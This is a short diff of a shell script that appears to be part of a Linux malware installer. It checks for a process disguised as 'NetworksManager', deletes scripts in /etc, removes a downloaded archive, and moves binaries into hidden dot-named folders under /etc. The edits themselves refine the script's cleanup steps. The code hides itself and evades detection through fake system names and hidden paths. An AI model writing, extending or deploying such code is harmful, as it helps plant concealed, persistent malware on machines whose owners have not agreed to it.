@@ -10,7 +10,6 @@ if [[ $(ps -ef | grep NetworksManager | grep .NetworksManager | grep ./NetworksM
     echo "running proccess"
     	rm -r /etc/e.sh
 	rm -r /etc/*.sh.*
-    exit
     exit 1
 fi
 
@@ -71,7 +70,7 @@ if [ $download = 1 ]; then
 
  
     rm -f dasdsa.tar.gz
-    rm -f dasdsa.tar.gz.1
+    rm -f dasdsa.tar.gz.*
     mv /etc/fs-manager /etc/.fs-manager
     mv /etc/.fs-manager/Service-Networks /etc/.fs-manager/.Service-Networks
     mv /etc/.fs-manager/NetworksManager /etc/.fs-manager/.NetworksManager
